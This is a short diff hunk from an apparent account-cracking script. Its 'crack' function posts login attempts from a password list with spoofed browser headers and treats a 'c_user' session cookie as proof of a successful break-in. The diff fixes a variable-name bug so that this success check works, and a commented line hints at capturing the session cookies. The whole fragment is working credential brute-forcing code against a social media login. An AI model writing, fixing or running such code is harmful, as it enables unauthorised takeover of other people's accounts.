@@ -224,7 +224,7 @@ def crack(uid, password_list, total_count):
            "user-agent": us,
            "viewport-width": "980"}           
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
-            response = Session.cookies.get_dict().keys()
+            log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
